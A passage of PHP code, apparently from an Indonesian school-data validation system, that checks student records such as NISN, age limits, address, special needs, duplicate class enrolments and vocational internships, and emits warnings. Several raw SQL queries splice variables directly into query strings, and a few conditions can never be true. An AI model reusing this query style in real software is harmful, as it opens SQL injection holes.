                                // if (!in_array($sekolahObj->getBentukPendidikanId(), array(13,14,15,37,39,55,60))) {
                                if (in_array($sekolahObj->getBentukPendidikanId(), array(5,6))) {
                                    if (!$siswa->getLintang() || !$siswa->getBujur()) {
                                        // $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b> harap mengisikan titik koordinat dengan benar. Dikarenakan untuk semester depan (2018/2019 Genap) akan di Invalidkan.";
                                        $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b> harap mengisikan titik koordinat dengan benar <b>(Rombel saat ini: {$tingkat_pendidikan_id} - {$nama_rombel})</b>";

                                        if (in_array($siswaRombelArr[$siswa->getPesertaDidikId()]['tingkat_pendidikan_id'], array(3,6,9,12,13))) {
                                            $this->setArrValidation($i++, "peserta_didik", 2, $keterangan);
                                        } else {
                                            $this->setArrValidation($i++, "peserta_didik", 1, $keterangan);
                                        }
                                    }
                                }

                                $nisn_num = preg_replace("/[^0-9]+/", "", $siswa->getNisn());
                                if (strlen($nisn_num) != 10) {
                                    $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b> harap mengisikan NISN dengan benar <b>(Rombel saat ini: {$tingkat_pendidikan_id} - {$nama_rombel})</b>";
                                    if ($siswa->getKewarganegaraan() == "ID") {
                                        if (in_array($siswaRombelArr[$siswa->getPesertaDidikId()]['tingkat_pendidikan_id'], array(3,6,9,12,13))) {
                                            if (
                                                strpos($regPd->getSekolahAsal(), "MI ") === FALSE
                                                && strpos($regPd->getSekolahAsal(), "MTs ") === FALSE
                                                && strpos($regPd->getSekolahAsal(), "Paket ") === FALSE
                                                && strpos($regPd->getSekolahAsal(), "LN ") === FALSE
                                                && strpos($regPd->getSekolahAsal(), "Belum ") === FALSE
                                            ) {
                                                $this->setArrValidation($i++, "peserta_didik", 2, $keterangan);
                                            } else {
                                                $this->setArrValidation($i++, "peserta_didik", 1, $keterangan);
                                            }
                                        } else {
                                            $this->setArrValidation($i++, "peserta_didik", 1, $keterangan);
                                        }
                                        $this->setTriggerValidation($app, "peserta_didik", $siswa->getPesertaDidikId(), "nisn", $keterangan);
                                    } else {
                                        $this->setArrValidation($i++, "peserta_didik", 1, $keterangan);
                                    }
                                }
                            // } 
                        }


                        if ($siswa->getJenisTinggalId() == 4) {
                            // tinggal di asrama
                            $siswaTinggalDiAsrama++;
                        }

                        if (in_array($siswa->getPesertaDidikId(), $siswaNyeleneuhArr[$siswa->getPesertaDidikId()])) {
                            $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b> pada rombongan belajar <b>".$siswaNyeleneuhArr[$siswa->getPesertaDidikId()]["nama_rombel"]."</b> salah dalam mengisi jenis pendaftaran pada anggota rombel. Jenis pendaftaran <b>Siswa Baru</b> hanya untuk tingkat pendidikan 1, 7, dan 10";
                            $this->setArrValidation($i++, "peserta_didik", 1, $keterangan);
                        }

                        if (!is_object($siswa->getMstWilayah())) {
                            $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b> salah dalam mengisi alamat kecamatan";
                            $this->setArrValidation($i++, "peserta_didik", 2, $keterangan);
                        } else {
                            if ($siswa->getMstWilayah()->getIdLevelWilayah() != 3) {
                                $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b> salah dalam mengisi alamat kecamatan";
                                $this->setArrValidation($i++, "peserta_didik", 2, $keterangan);
                            }
                        }

                        if ($siswa->getAgamaId() == 99) {
                            $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b> jika penghayat kepercayaan, silakan diubah menjadi pilihan Kepercayaan kpd Tuhan YME";
                            $this->setArrValidation($i++, "peserta_didik", 1, $keterangan);
                        }

                        list($yy, $mm, $dd) = explode("-", $siswa->getTanggalLahir());
                        $thn_nisn_from_year = substr($yy, 1, 3);
                        $thn_nisn_from_nisn = substr($siswa->getNisn(), 0, 3);

                        if (trim($siswa->getTempatLahir()) == "") {
                            $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b>, Tempat Lahir harap diisi dengan benar";
                            $this->setArrValidation($i++, "peserta_didik", 2, $keterangan);

                            $this->setTriggerValidation($app, "peserta_didik", $siswa->getPesertaDidikId(), "tempat_lahir", $keterangan);
                        }

                        if ($siswa->getJenisTinggalId() == 99 && trim($siswa->getJenisTinggalId()) == "")  {
                            $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b>, Tempat Tinggal harap diisi dengan benar";
                            $this->setArrValidation($i++, "peserta_didik", 2, $keterangan);
                        }

                        if ($siswa->getAlatTransportasiId() == 99 && trim($siswa->getAlatTransportasiId()) == "")  {
                            $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b>, Moda Transportasi harap diisi dengan benar";
                            $this->setArrValidation($i++, "peserta_didik", 2, $keterangan);
                        }

                        if ($siswa->getPenerimaKps() == 1 && ($jmlKps+$jmlPkh) < 1) {
                            $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b>, jika Penerima KPS/PKH memilih 'Ya' agar No KPS/PKH di isi dengan benar";
                            $this->setArrValidation($i++, "peserta_didik", 1, $keterangan);
                        }

                        if ($siswa->getPenerimaKip() == 1 && $jmlPip < 1) {
                            $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b>, jika Penerima KIP memilih 'Ya' agar No KIP di isi dengan benar";
                            $this->setArrValidation($i++, "peserta_didik", 2, $keterangan);
                        }

                        if (in_array($sekolahObj->getBentukPendidikanId(), array(7,8,14,29))) {
                            if ($siswa->getKebutuhanKhususId() < 1) {
                                $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b>, tidak memilih kebutuhan khusus pada sekolah jenjang {$sekolahObj->getBentukPendidikan()->getNama()}";
                                $this->setArrValidation($i++, "peserta_didik", 2, $keterangan);
                            }
                        } else {
                            if ($siswa->getKebutuhanKhususId() > 0) {
                                $siswaMemilikiKebutuhanKhusus++;
                            }
                        }

                        $refKebutuhanKhususObj = KebutuhanKhususPeer::retrieveByPk($siswa->getKebutuhanKhususId());
                        if (is_object($refKebutuhanKhususObj)) {
                            $jumlahKebutuhanKhususPerAbk = ($refKebutuhanKhususObj->getKkA()
                                                            +$refKebutuhanKhususObj->getKkB()
                                                            +$refKebutuhanKhususObj->getKkC()
                                                            +$refKebutuhanKhususObj->getKkC1()
                                                            +$refKebutuhanKhususObj->getKkD()
                                                            +$refKebutuhanKhususObj->getKkD1()
                                                            +$refKebutuhanKhususObj->getKkE()
                                                            +$refKebutuhanKhususObj->getKkF()
                                                            +$refKebutuhanKhususObj->getKkH()
                                                            +$refKebutuhanKhususObj->getKki()
                                                            +$refKebutuhanKhususObj->getKkJ()
                                                            +$refKebutuhanKhususObj->getKkK()
                                                            +$refKebutuhanKhususObj->getKkN()
                                                            +$refKebutuhanKhususObj->getKkO()
                                                            +$refKebutuhanKhususObj->getKkP()
                                                            +$refKebutuhanKhususObj->getKkQ()
                                                            );

                            if ($jumlahKebutuhanKhususPerAbk >= 4) {
                                $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b>, memiliki kebutuhan khusus sebanyak <b>".$jumlahKebutuhanKhususPerAbk."</b> kebutuhan khusus. Pastikan data yang ada inputkan benar";
                                $this->setArrValidation($i++, "peserta_didik", 1, $keterangan);
                            }
                        }

                        // $age = $this->getUsiaPtk($siswa->getTanggalLahir());
                        $age = $this->getUsiaPd($siswa->getTanggalLahir());
                        /* if ($siswa->getPesertaDidikId() == "6134e165-1f6c-e211-b82b-b53b3210d20e") {
                            echo $siswa->getNama()."<br>";
                            echo $siswa->getTempatLahir()."<br>";
                            echo $siswa->getTanggalLahir()."<br>";
                            print_r($age); die;
                        } */

                        if (in_array($sekolahObj->getBentukPendidikanId(), array(5,6,13,15))) {
                            if ($age->y < 6) {
                                if ($age->y == 5 && $age->m >= 6) {
                                    // boleh
                                    $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b>, terhitung dari tanggal 01 Juli {$tahunAjaranId} berusia <b>".$age->y." tahun ".$age->m." bulan</b> (kurang dari 6 thn). Harus melengkapi dengan dokumen dari psikolog/dewan guru ke dinas pendidikan untuk diunggah di manajemen";
                                    $this->setArrValidation($i++, "peserta_didik", 1, $keterangan);
                                } else {
                                    $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b>, terhitung dari tanggal 01 Juli {$tahunAjaranId} berusia <b>".$age->y." tahun ".$age->m." bulan</b> (Sesuai dengan permendikbud Nomor 14 Tahun 2018 Usia Paling rendah untuk peserta didik SD adalah 5 Tahun 6 Bulan";
                                    $this->setArrValidation($i++, "peserta_didik", 2, $keterangan);
                                    // break;

                                    $this->setTriggerValidation($app, "peserta_didik", $siswa->getPesertaDidikId(), "tanggal_lahir", "Terdeteksi tanggal lahir tidak wajar");
                                }
                            }
                        }
                        
                        $age = $age->y;

                        if ($age < 4) {
                            $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b>, usia terhitung ({$age}) thn (dibawah 4 thn)";
                            if ($siswaRombelArr[$siswa->getPesertaDidikId()]['tingkat_pendidikan_id'] >= 1 && $siswaRombelArr[$siswa->getPesertaDidikId()]['tingkat_pendidikan_id'] <= 13) {
                                $this->setArrValidation($i++, "peserta_didik", 2, $keterangan);
                            } else {
                                $this->setArrValidation($i++, "peserta_didik", 1, $keterangan);
                            }
                        }

                        if ($age > 16) {
                            if (in_array($sekolahObj->getBentukPendidikanId(), $sd)) {
                                $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b>, usia terhitung ($age) thn. Untuk jenjang {$sekolahObj->getBentukPendidikan()->getNama()} usia normal PD dibawah 17 thn";
                                $this->setArrValidation($i++, "peserta_didik", 1, $keterangan);;
                            }
                        }

                        if ($age < 9) {
                            if (in_array($sekolahObj->getBentukPendidikanId(), $smp)) {
                                $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b>, usia terhitung ($age) thn. Untuk jenjang {$sekolahObj->getBentukPendidikan()->getNama()} usia PD tidak diperkenankan dibawah 9 thn";
                                $this->setArrValidation($i++, "peserta_didik", 1, $keterangan);
                            }
                        }

                        $kodeProp = substr($sekolahObj->getKodeWilayah(), 0, 2);
                        $prop3T = array(21, 27, 24, 25, 32, 35);
                        if ($age > 30 /* && (  !in_array($sekolahObukj->getBentukPendidikanId(), array(7,8,29,14)) 
                                            && !in_array($kodeProp, $prop3T) 
                                            && $sekolahObj->getNpsn() != '20109930') */
                                         ) {
                            $kodevalidasi = 2;
                            if (in_array($sekolahObj->getBentukPendidikanId(), array(7,8,29,14))) {
                                $kodevalidasi = 1;
                            }
                            if (in_array($kodeProp, $prop3T)) {
                                $kodevalidasi = 1;
                            }
                            if ($sekolahObj->getNpsn() == '20109930') {
                                $kodevalidasi = 1;
                            }
                            $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b>, usia terhitung tidak normal. (Umur: {$age} thn)";
                            $this->setArrValidation($i++, "peserta_didik", $kodevalidasi, $keterangan);
                        } else if ($age > 21) {
                            $keterangan = "Peserta Didik a/n <b>{$siswa->getNama()}</b>, usia terhitung lebih dari 21 tahun. (Umur: {$age} thn)";
                            $this->setArrValidation($i++, "peserta_didik", 1, $keterangan);
                        }

                        // peserta didik longitudinal
                        $c = new \Criteria();
                        $c->add(PesertaDidikLongitudinalPeer::PESERTA_DIDIK_ID, $siswa->getPesertaDidikId());
                        $c->add(PesertaDidikLongitudinalPeer::SEMESTER_ID, $sessionSemester);
                        $c->add(PesertaDidikLongitudinalPeer::SOFT_DELETE, 0);
                        $countSisLongs = PesertaDidikLongitudinalPeer::doCount($c);
                        $pesertaDidikLong = PesertaDidikLongitudinalPeer::doSelectOne($c);

                        if ($countSisLongs < 1) {
                            $keterangan = "Data Rinci <b>Periodik Peserta Didik</b> a/n <b>{$siswa->getNama()}</b> utk Periode <b>{$namaSemester} / {$tahunAjaranId}</b> masih kosong";
                            $this->setArrValidation($i++, "peserta_didik_longitudinal", 1, $keterangan);
                        } else {
                            if ($pesertaDidikLong->getTinggiBadan() < 1) {
                                $keterangan = "Data Rinci <b>Periodik Peserta Didik</b> a/n <b>{$siswa->getNama()}</b> utk Periode <b>{$namaSemester} / {$tahunAjaranId}</b> pd kolom <b>Tinggi Badan</b> harap diisi dengan benar";
                                $this->setArrValidation($i++, "peserta_didik_longitudinal", 1 , $keterangan);
                            }

                            if ($pesertaDidikLong->getBeratBadan() < 1) {
                                $keterangan = "Data Rinci <b>Periodik Peserta Didik</b> a/n <b>{$siswa->getNama()}</b> utk Periode <b>{$namaSemester} / {$tahunAjaranId}</b> pd kolom <b>Berat Badan</b> harap diisi dengan benar";
                                $this->setArrValidation($i++, "peserta_didik_longitudinal", 1 , $keterangan);
                            }

                            if (($pesertaDidikLong->getWaktuTempuhKeSekolah() < 1) && ($pesertaDidikLong->getMenitTempuhKeSekolah() < 1)) {
                                $keterangan = "Data Rinci <b>Periodik Peserta Didik</b> a/n <b>{$siswa->getNama()}</b> utk Periode <b>{$namaSemester} / {$tahunAjaranId}</b> pd kolom <b>Waktu tempuh ke sekolah</b> harap diisi dengan benar";
                                $this->setArrValidation($i++, "peserta_didik_longitudinal", 1 , $keterangan);
                            }
                        }

                        // cek data siswa berganda
                        $sql = "select
                                    rombongan_belajar.tingkat_pendidikan_id,
                                    rombongan_belajar.nama
                                from anggota_rombel
                                join rombongan_belajar on anggota_rombel.rombongan_belajar_id = rombongan_belajar.rombongan_belajar_id
                                where 
                                    anggota_rombel.soft_delete = 0
                                    and anggota_rombel.peserta_didik_id = '{$siswa->getPesertaDidikId()}'
                                    and rombongan_belajar.soft_delete = 0
                                    and rombongan_belajar.jenis_rombel in (1,8,9,10,11,12,13)
                                    and rombongan_belajar.semester_id = '{$sessionSemester}'
                                ";
                        $siswaBergandaArr = getDataBySql($sql, FALSE, DBNAME);

                        $namaRombels = array();
                        if (count($siswaBergandaArr) > 1) {
                            foreach ($siswaBergandaArr as $berganda) {
                                $namaRombels[] = $berganda['nama'];
                            }

                            $rombonganBelajars = implode(", ", $namaRombels);
                            $keterangan = "Data berganda pada <b>Anggota Rombel</b> a/n <b>{$siswa->getNama()}</b> pada Rombel (<b>{$rombonganBelajars}</b>) utk Periode <b>{$namaSemester} / {$tahunAjaranId}</b>";
                            $this->setArrValidation($i++, "anggota_rombel", 2, $keterangan);
                        }
                    }

                    /* $sql = "SELECT
                                e.kode_wilayah AS kode_wilayah_sekolah,
                                e.sekolah_id,
                                d.peserta_didik_id,
                                ar.anggota_rombel_id,
                                rpd.registrasi_id,
                                b.rombongan_belajar_id,
                                b.tingkat_pendidikan_id kelas,
                                b.nama AS rombel,
                                d.nama nama_pd,
                                d.tanggal_lahir,
                                d.nisn,
                                d.nama_ibu_kandung AS nama_ibu
                            FROM anggota_rombel ar
                            JOIN rombongan_belajar b ON ar.rombongan_belajar_id = b.rombongan_belajar_id
                            JOIN registrasi_peserta_didik rpd ON ar.peserta_didik_id = rpd.peserta_didik_id AND b.sekolah_id = rpd.sekolah_id
                            JOIN peserta_didik d ON ar.peserta_didik_id = d.peserta_didik_id
                            JOIN sekolah e ON rpd.sekolah_id = e.sekolah_id
                            JOIN ptk f ON b.ptk_id = f.ptk_id
                            WHERE
                                b.soft_delete = 0
                                AND b.jenis_rombel IN (1, 8, 9, 10)
                                AND ar.soft_delete = 0
                                AND d.soft_delete = 0
                                AND rpd.soft_delete = 0
                                AND f.Soft_delete = 0
                                AND e.soft_delete = 0
                                AND e.bentuk_pendidikan_id IN (5,53,6,54,7,8,14,29,13,55,15)
                                AND rpd.jenis_keluar_id IS NULL
                                AND b.semester_id = '{sessionSemester}'
                                AND d.peserta_didik_id = '{$sekolah_id}'"; */

                    $c = new \Criteria();
                    $c->add(GugusSekolahPeer::SEKOLAH_INTI_ID, $sekolah_id);
                    $c->add(GugusSekolahPeer::SOFT_DELETE, 0);
                    $c->add(GugusSekolahPeer::JENIS_GUGUS_ID, 10);
                    $sekolahPonpesCount = GugusSekolahPeer::doCount($c);

                    if (($siswaTinggalDiAsrama/sizeof($siswas)) > 0.5 && $sekolahPonpesCount < 1) {
                        $keterangan = "Terdeteksi lebih dari setengah peserta didik tinggal di asrama. Jika sekolah menyelenggarakan pondok pesantren harap isi identitas <b>Penyelenggara Pondok Pesantren</b> yang berada pada Data Rinci Sekolah";
                        $this->setArrValidation($i++, "peserta_didik", 1, $keterangan);
                    }

                    if ($siswaMemilikiKebutuhanKhusus > 10 && $countProgramInklusi < 0) {
                        $keterangan = "Terdeteksi data tidak wajar. Sekolah berstatus Reguler dan tidak mengisikan Program Inklusi namun memiliki siswa/i berkebutuhan khusus berjumlah diatas 10 orang. Periksa kembali kebenaran data tersebut";
                        $this->setArrValidation($i++, "peserta_didik", 1, $keterangan);
                    } 

                    if ($countProgramInklusi > 0 && $siswaMemilikiKebutuhanKhusus > 20) {
                        $keterangan = "Terdeteksi data tidak wajar. Sekolah berstatus Reguler dan mengisikan Program Inklusi namun memiliki siswa/i berkebutuhan khusus berjumlah diatas 20 orang. Periksa kembali kebenaran data tersebut";
                        $this->setArrValidation($i++, "peserta_didik", 1, $keterangan);
                    }

                    // echo "$countProgramInklusi > 0 && $siswaMemilikiKebutuhanKhusus"; die;
                    if ($countProgramInklusi > 0 && $siswaMemilikiKebutuhanKhusus < 1) {
                        $keterangan = "Terdeteksi data tidak wajar. Sekolah mengisikan Program Inklusi namun tidak memiliki siswa/i berkebutuhan khusus. Periksa kembali kebenaran data tersebut";
                        $this->setArrValidation($i++, "peserta_didik", 1, $keterangan);
                    }

                    $query = "SELECT
								reg.nipd
							FROM registrasi_peserta_didik reg
							INNER JOIN peserta_didik pd ON reg.peserta_didik_id = pd.peserta_didik_id
							WHERE
								reg.soft_delete = 0
								AND reg.jenis_keluar_id IS NULL
								AND reg.sekolah_id = '{$sekolah_id}'
								AND reg.nipd IS NOT NULL
								AND reg.nipd <> ''
								AND pd.soft_delete = 0
							GROUP BY
								reg.nipd
							HAVING
								COUNT (1) > 1";

					$nipdDobel = getDataBySql($query, FALSE, DBNAME);

					$arrNipdDobel = array();
					foreach ($nipdDobel as $value) {
						array_push($arrNipdDobel, $value['nipd']);
					}

					if (sizeof($nipdDobel) > 0) {

						$c = new \Criteria();
						$c->addJoin(RegistrasiPesertaDidikPeer::PESERTA_DIDIK_ID, PesertaDidikPeer::PESERTA_DIDIK_ID);
						$c->add(RegistrasiPesertaDidikPeer::SEKOLAH_ID, $sekolah_id);
						$c->add(RegistrasiPesertaDidikPeer::NIPD, $arrNipdDobel, \Criteria::IN);
						$c->add(RegistrasiPesertaDidikPeer::JENIS_KELUAR_ID, NULL, \Criteria::ISNULL);
						$c->add(PesertaDidikPeer::SOFT_DELETE, 0);

						// print_r($c->toString()); die;
						$regPdObj = RegistrasiPesertaDidikPeer::doSelect($c);

						$namaNipdDobelArr = array();
						foreach ($regPdObj as $reg) {
							$arrOut[$reg->getNipd()][] = $reg->getPesertaDidik()->getNama();
						}

						// print_r($arrOut);
						foreach ($arrOut as $key => $value) {
							$namaNipdDobel = implode(", ", $value);

							// echo $namaNipdDobel;
							// print_r($value);
		                    $keterangan = "Ditemukan NIPD <b>{$key}</b> Peserta Didik yang berganda dengan nama <b>$namaNipdDobel</b>";
		                    $this->setArrValidation($i++, "peserta_didik", 2, $keterangan);
						}
						// die;
	                }
                }

                // Anggota Rombel
                $query = "
                        select
                            count(*)
                        from peserta_didik a
                        left join (
                            select
                                a.anggota_rombel_id,
                                a.peserta_didik_id
                            from anggota_rombel a
                            join rombongan_belajar b on a.rombongan_belajar_id = b.rombongan_belajar_id
                            where
                                a.soft_delete = 0
                                and b.soft_delete = 0
                                and b.semester_id = '{$sessionSemester}'
                                and b.sekolah_id = '{$sekolah_id}'
                                and b.jenis_rombel in (1,8,9,10,11,12,13)
                        ) b on a.peserta_didik_id = b.peserta_didik_id
                        left join registrasi_peserta_didik c on a.peserta_didik_id = c.peserta_didik_id
                        where
                            c.sekolah_id = '{$sekolah_id}'
                            and b.peserta_didik_id IS NULL
                            and c.jenis_keluar_id IS NULL
                            and c.soft_delete=  0
                            and a.soft_delete = 0";
                // echo $query; die;

                $countSiswaDiluarRombel = getValueBySql($query, DBNAME);

                if ($countSiswaDiluarRombel > 0) {
                    $keterangan = "Terdapat sejumlah <b>{$countSiswaDiluarRombel}</b> untuk <b>Peserta Didik</b> yg belum masuk ke dalam <b>Rombongan Belajar</b>";
                    $this->setArrValidation($i++, "anggota_rombel", 2, $keterangan);
                }

                /* // Peserta Didik Baru
                $c = new \Criteria();
                $c->add(PesertaDidikBaruPeer::SEKOLAH_ID, $sekolah_id);
                $c->add(PesertaDidikBaruPeer::TAHUN_AJARAN_ID, $tahunAjaranId);
                $c->add(PesertaDidikBaruPeer::BERHASIL_DIPROSES, 0);
                $c->add(PesertaDidikBaruPeer::SUDAH_DIPROSES, 0);
                $c->add(PesertaDidikBaruPeer::SOFT_DELETE, 0);
                $pdb = PesertaDidikBaruPeer::doSelect($c);

                foreach ($pdb as $key => $value) {
                    $arr = $value->toArray(\BasePeer::TYPE_FIELDNAME);

                    $colEmpty = array();
                    foreach ($arr as $key => $value) {
                        $val = trim($value);

                        if (!in_array($key, array('nisn', 'nik', 'soft_delete', 'sudah_diproses', 'berhasil_diproses', 'peserta_didik_id'))) {
                            if (!$val) {
                                    array_push($colEmpty, humanize($key));
                            }
                        }
                    }

                    $colEmpty = implode(", ", $colEmpty);

                    if ($colEmpty) {
                        $keterangan = "<b>Peserta Didik Baru</b> a/n <b>{$arr['nama_pd']}</b> masih terdapat kolom yg belum lengkap : (<b>{$colEmpty}</b>)";
                        $this->setArrValidation($i++, "peserta_didik_baru", 1, $keterangan);
                    }
                } */

                if ($sekolahObj->getBentukPendidikanId() == 15) {                    
                    $sqlSiswaPrakerinTingkatAkhir = "
                            select
                                DISTINCT
                                rombongan_belajar.nama as nama_rombel,
                                rombongan_belajar.tingkat_pendidikan_id,
                                jurusan.nama_jurusan,
                                jenis_rombel.nm_jenis_rombel as jenis_rombel,
                                peserta_didik.nama
                            from anggota_rombel
                            join rombongan_belajar on anggota_rombel.rombongan_belajar_id = rombongan_belajar.rombongan_belajar_id
                            join jurusan_sp on rombongan_belajar.jurusan_sp_id = jurusan_sp.jurusan_sp_id and jurusan_sp.sekolah_id = rombongan_belajar.sekolah_id
                            join sekolah on rombongan_belajar.sekolah_id = sekolah.sekolah_id
                            join ref.jurusan on jurusan_sp.jurusan_id = jurusan.jurusan_id
                            join ref.jenis_rombel on rombongan_belajar.jenis_rombel = jenis_rombel.jenis_rombel
                            join peserta_didik on anggota_rombel.peserta_didik_id = peserta_didik.peserta_didik_id
                            join registrasi_peserta_didik on peserta_didik.peserta_didik_id = registrasi_peserta_didik.peserta_didik_id
                                and registrasi_peserta_didik.sekolah_id = sekolah.sekolah_id 
                                and registrasi_peserta_didik.Soft_delete = 0
                                and registrasi_peserta_didik.jenis_keluar_id is null
                            join (
                                select
                                    kur.nama_kurikulum,
                                    mpk.kurikulum_id,
                                    max(mpk.tingkat_pendidikan_id) as max_tingkat_pendidikan_id
                                from ref.mata_pelajaran_kurikulum mpk
                                join ref.kurikulum kur on mpk.kurikulum_id = kur.kurikulum_id
                                where 
                                    mpk.expired_date is null
                                    and kur.expired_date is null
                                    and mpk.tingkat_pendidikan_id in (12,13)
                                    and kur.jurusan_id is not null
                                    and kur.nama_kurikulum like '%SMK%'
                                group by
                                    kur.nama_kurikulum,
                                    mpk.kurikulum_id
                            ) as is_4thn on rombongan_belajar.kurikulum_id = is_4thn.kurikulum_id
                                and rombongan_belajar.tingkat_pendidikan_id = is_4thn.max_tingkat_pendidikan_id
                            left join (
                                select
                                    anggota_akt_pd.registrasi_id
                                from anggota_akt_pd
                                join akt_pd on anggota_akt_pd.id_akt_pd = akt_pd.id_akt_pd
                                join mou on akt_pd.mou_id = mou.mou_id
                                join dudi on mou.dudi_id = dudi.dudi_id
                                where
                                    anggota_akt_pd.Soft_delete = 0
                                    and akt_pd.Soft_delete = 0
                                    and akt_pd.id_jns_akt_pd = 1
                                    and mou.id_jns_ks = 1
                                    and mou.Soft_delete = 0
                                    and dudi.Soft_delete = 0
                            ) as angg_akt_pd on registrasi_peserta_didik.registrasi_id = angg_akt_pd.registrasi_id
                            where 
                                anggota_rombel.soft_delete = 0
                                and rombongan_belajar.soft_delete = 0
                                and rombongan_belajar.semester_id = '{$sessionSemester}'
                                and rombongan_belajar.jenis_rombel in (1,8,9,10,11,12,13)
                                and sekolah.sekolah_id = '{$sekolah_id}'
                                and peserta_didik.soft_delete = 0
                                and angg_akt_pd.registrasi_id is null";
    
                    // echo "Jumlah validasi : ".$this->getTotalCountValidation(); die;
                    $totalCountValidationRinci = json_decode($this->getTotalCountValidation(true), TRUE);
                    // print_r($totalCountValidationRinci);
                    // echo "Warning: ".$totalCountValidationRinci['warning']."<br>";
                    // echo "Invalid: ".$totalCountValidationRinci['invalid'];
                    // die;
                    if ($totalCountValidationRinci['invalid'] > 200) {
                        // global
                        $sql = "SELECT COUNT(1) AS jumlah FROM ({$sqlSiswaPrakerinTingkatAkhir}) AS xxx";
                        $siswaPrakerinTingkatAkhirGlobal = getValueBySql($sql, DBNAME);
                        
                        if ($siswaPrakerinTingkatAkhirGlobal > 0) {
                            $keterangan = "Terdapat peserta didik tingkat akhir sejumlah <b>{$siswaPrakerinTingkatAkhirGlobal}</b> yang belum pernah melakukan Prakerin";
                            $this->setArrValidation($i++, "peserta_didik", 2, $keterangan);
                        }
                    } else {
                        // by name
                        $siswaPrakerinTingkatAkhirByName = getDataBySql($sqlSiswaPrakerinTingkatAkhir, FALSE, DBNAME);
                        foreach ($siswaPrakerinTingkatAkhirByName as $siswaPrakerin) {
                            $keterangan = "Peserta Didik a/n <b>".$siswaPrakerin['nama']."</b> yang terdapat pada rombel <b>".$siswaPrakerin['tingkat_pendidikan_id']."-".$siswaPrakerin['nama_rombel']."</b> dengan Kompetensi Keahlian <b>".$siswaPrakerin['nama_jurusan']."</b> terdeteksi belum pernah melakukan Prakerin Siswa";
                            $this->setArrValidation($i++, "peserta_didik", 2, $keterangan);
                        }
                    }
                } else if ($sekolahObj->getBentukPendidikanId() == 13) {
                    $sql = "select
                                anggota_rombel.peserta_didik_id,
                                jurusan.jurusan_id,
                                peserta_didik.nama,
                                peserta_didik.nisn,
                                max(case when rombongan_belajar.jenis_rombel in (1,11,12,13) then rombongan_belajar.nama else rombongan_belajar.nama end) as rombel,
                                count(distinct rombongan_belajar.jenis_rombel) as jumlah
                            from anggota_rombel
                            join rombongan_belajar on anggota_rombel.rombongan_belajar_id = rombongan_belajar.rombongan_belajar_id
                            join jurusan_sp on rombongan_belajar.jurusan_sp_id = jurusan_sp.jurusan_sp_id
                            join ref.jurusan on jurusan_sp.jurusan_id = jurusan.jurusan_id
                            join peserta_didik on anggota_rombel.peserta_didik_id = peserta_didik.peserta_didik_id
                            join registrasi_peserta_didik on 
                                peserta_didik.peserta_didik_id = registrasi_peserta_didik.peserta_didik_id 
                                and rombongan_belajar.sekolah_id = registrasi_peserta_didik.sekolah_id
                            where 
                                anggota_rombel.soft_delete = 0
                                and rombongan_belajar.soft_delete = 0
                                and rombongan_belajar.jenis_rombel in (1,2,11,12,13)
                                and rombongan_belajar.semester_id = '{$sessionSemester}'
                                and rombongan_belajar.sekolah_id = '{$sekolah_id}'
                                and registrasi_peserta_didik.soft_delete = 0
                                and registrasi_peserta_didik.jenis_keluar_id is null 
                                and peserta_didik.soft_delete = 0
                                and jurusan.jurusan_id not in ('00000105','00000051')
                            group by 
                                anggota_rombel.peserta_didik_id,
                                jurusan.jurusan_id,
                                peserta_didik.nama,
                                peserta_didik.nisn
                            having count(distinct rombongan_belajar.jenis_rombel) > 1";
                    $dataLintasMinat = getDataBySql($sql, FALSE, DBNAME);

                    foreach ($dataLintasMinat as $lm) {
                        $keterangan = "Terdapat peserta didik <b>(Nama: {$lm['nama']}, NISN: {$lm['nisn']}, Rombel: {$lm['rombel']})</b> berada pada rombel reguler dan teori dengan jurusan yang sama";
                        $this->setArrValidation($i++, "peserta_didik", 2, $keterangan);
                    }

                }

            } else if ($jenis_validasi == "rombongan_belajar") {

                //rombonganbelajar harus ada jurusan sp
                $bentukPendidikan = $sekolahObj->getBentukPendidikanId();
                $bentukPendidikanNama = $sekolahObj->getBentukPendidikan()->getNama();

                // Rombel
                $c = new \Criteria();
                $c->add(RombonganBelajarPeer::SEKOLAH_ID, $sekolah_id);
                $c->add(RombonganBelajarPeer::SEMESTER_ID, $sessionSemester);
                $c->add(RombonganBelajarPeer::SOFT_DELETE, 0);
                $c->add(RombonganBelajarPeer::JENIS_ROMBEL, array(1,3,8,9,10,11,12,13,51), \Criteria::IN);
                $c->addJoin(RombonganBelajarPeer::JURUSAN_SP_ID, JurusanSpPeer::JURUSAN_SP_ID, \Criteria::LEFT_JOIN);
                $c->addJoin(JurusanSpPeer::JURUSAN_ID, JurusanPeer::JURUSAN_ID, \Criteria::LEFT_JOIN);
                $rombels = RombonganBelajarPeer::doSelect($c);
                $count = sizeof($rombels);

                if ($count < 1) {
                    $keterangan = "Data Rombongan Belajar Kosong";
                    $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                } else {

                    if ($bentukPendidikan == 15) {

                        $sql = "select
                                    rombongan_belajar.*
                                from rombongan_belajar
                                join sekolah on rombongan_belajar.sekolah_id = sekolah.sekolah_id
                                join jurusan_sp on rombongan_belajar.jurusan_sp_id = jurusan_sp.jurusan_sp_id
                                join ref.kurikulum on rombongan_belajar.kurikulum_id = kurikulum.kurikulum_id
                                where
                                    sekolah.sekolah_id = '{$sekolah_id}'
                                    and sekolah.bentuk_pendidikan_id = 15
                                    and rombongan_belajar.semester_id = '{$sessionSemester}'
                                    and rombongan_belajar.soft_delete = 0
